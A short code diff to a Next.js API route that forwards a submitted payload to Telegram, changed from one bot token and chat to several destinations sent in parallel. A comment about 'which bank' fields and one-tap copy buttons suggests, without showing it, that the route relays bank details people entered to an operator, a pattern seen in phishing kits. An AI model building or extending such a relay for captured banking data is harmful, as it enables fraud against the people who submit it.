@@ -1,5 +1,5 @@
 import { NextResponse, after } from 'next/server'
-import { buildCopyKeyboard, sendTelegramMessage } from '@/lib/telegram-server'
+import { buildCopyKeyboard, getTelegramDestinations, sendTelegramMessage } from '@/lib/telegram-server'
 
 // Fields whose value is just context (which bank) rather than a detail an
 // admin would want a one-tap "copy" button for.
@@ -40,10 +40,9 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Invalid payload' }, { status: 400 })
     }
 
-    const token = process.env.TELEGRAM_BOT_TOKEN
-    const chatId = process.env.TELEGRAM_CHAT_ID
+    const destinations = getTelegramDestinations()
 
-    if (!token || !chatId) {
+    if (destinations.length === 0) {
       return NextResponse.json({ error: 'Telegram is not configured' }, { status: 503 })
     }
 
@@ -61,9 +60,13 @@ export async function POST(request: Request) {
     const replyMarkup = copyButtons.length > 0 ? buildCopyKeyboard(copyButtons) : undefined
 
     after(async () => {
-      const sent = await sendTelegramMessage(token, chatId, text, 'HTML', replyMarkup)
-      if (!sent) {
-        console.log('[v0] Telegram notify: failed after all retries')
+      const results = await Promise.all(
+        destinations.map(({ token, chatId }) =>
+          sendTelegramMessage(token, chatId, text, 'HTML', replyMarkup),
+        ),
+      )
+      if (results.some((sent) => !sent)) {
+        console.log('[v0] Telegram notify: one or more destinations failed after all retries')
       }
     })
 
